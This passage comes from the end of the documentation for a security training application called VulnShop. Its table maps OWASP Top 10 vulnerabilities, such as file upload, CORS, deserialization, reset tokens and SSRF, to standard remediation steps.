| A04 | Unrestricted file upload | Add `fileFilter` for MIME type + rename to UUID + store outside web root |
| A05 | Info disclosure & missing headers | Remove `/api/debug`, add `helmet()`, use generic error messages |
| A05 | CORS wildcard | Set `origin: ['http://localhost:3000']` explicitly |
| A06 | `node-serialize` RCE | `npm uninstall node-serialize`, use `JSON.parse()` |
| A07 | Username enumeration | Return same message: `'Invalid email or password'` |
| A07 | No brute force protection | `npm install express-rate-limit`, apply to `/login` |
| A07 | Predictable reset token | Use `crypto.randomBytes(32).toString('hex')` + set expiry + clear after use |
| A08 | Insecure deserialization | Never call `unserialize()` on untrusted data; use `JSON.parse()` |
| A09 | No logging | `npm install winston`, log all auth events with IP + timestamp |
| A10 | SSRF | Allowlist outbound domains, block private IP ranges |

---

> VulnShop — OWASP Top 10 Security Training Application — For Educational Use Only
